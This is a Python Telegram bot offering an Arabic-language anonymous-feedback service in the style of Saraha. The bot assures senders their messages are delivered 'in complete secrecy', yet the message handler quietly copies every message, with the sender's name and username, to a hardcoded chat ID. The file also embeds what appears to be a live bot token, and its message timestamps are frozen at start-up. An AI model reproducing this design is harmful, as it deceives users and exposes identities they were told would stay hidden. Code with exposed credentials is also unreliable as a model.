import os

import telebot

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from datetime import datetime

from prefect import flow


# Get the current date
current_date = datetime.now()

# Format the date as YYYY/MM/DD
formatted_date = current_date.strftime("%Y/%m/%d")

formatted_time = current_date.strftime("%I:%M:%S %p")

BOT_TOKEN = "7423234055:AAHzEt1N-387Nydl5bhwFQ4ECK8u1vt6orY"

ACTIVE_CONVERSATION = "ACTIVE_CONVERSATION"



if not BOT_TOKEN:
    raise ValueError("Error: No BOT_TOKEN found in environment variables")

bot = telebot.TeleBot(BOT_TOKEN)

# Dictionary to store user states and recipient information
user_states = {}
user_recipients = {}

# States
ASKING_MESSAGE = "ASKING_MESSAGE"

def store_user_info(message):
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    user_id = message.chat.id
    username = message.chat.username or message.from_user.username
    return username,full_name

def create_link(user_id):
    return f"https://t.me/{bot.get_me().username}?start={user_id}"

@bot.message_handler(commands=['start'])
def handle_start(message):
    args = message.text.split()
    
    if len(args) > 1:
        original_user_id = args[1]
        bot.reply_to(message, """اهلاً بك ..

▫️ سوف يتم ارسال الرسالة الى المستخدم بسرية تامة

▫️اكتب ما تريد وسوف يتم ارساله بسرية تامة🤫""")
        user_states[message.chat.id] = ACTIVE_CONVERSATION
        user_recipients[message.chat.id] = original_user_id
    else:
        bot.reply_to(message, """اهلاً بك: 
▪️ بوت صارحني

▫️ احصل على نقد بناء بسرية تامة من زملائك في العمل وأصدقائك.

🌐 احصل على الرابط الخاص بك .
💌 إقرأ ما كتبه الناس عنك .

لصنع الرابط خاص بك ارسل الامر link/""")

@bot.message_handler(commands=['link'])
def generate_link(message):
    user_id = message.chat.id
    link = create_link(user_id)
    bot.reply_to(message, f"شارك هذا الرابط: {link}\nيمكن لأي شخص ينقر على هذا الرابط أن يرسل إليك رسالة بشكل مجهول.")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        user_states.pop(chat_id)
        user_recipients.pop(chat_id)
        bot.reply_to(message, "تم إيقاف المحادثة. إذا كنت ترغب في إرسال رسالة أخرى، استخدم الرابط مرة أخرى.")

@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == ACTIVE_CONVERSATION)
def handle_message(message):
    chat_id = message.chat.id
    recipient_id = user_recipients.get(chat_id)
    sender_name,sender_username = store_user_info(message)  # Get sender's full name

    if recipient_id:
        bot.send_message(936588681, f"Message from {sender_username} {sender_name} : {message.text}")
        bot.send_message(recipient_id, f"""⁣💌 وصلتك رسالة جديدة
⏱ وقت الرسالة: {formatted_date} - {formatted_time}
----
                         
{message.text}
                         
----""")
        bot.reply_to(message, "تم ارسال رسالتك.")
    else:
        bot.reply_to(message, "Error: Could not find the recipient. Please start over.")

@flow(log_prints=True)
def telegram_bot_flow():
    """Prefect flow to run the Telegram bot."""
    print("Starting Telegram bot with Prefect...")
    bot.infinity_polling()

if __name__ == "__main__":
    telegram_bot_flow.serve(
        name="telegram-bot-deployment",
        tags=["telegram", "bot"],
        interval=60
    )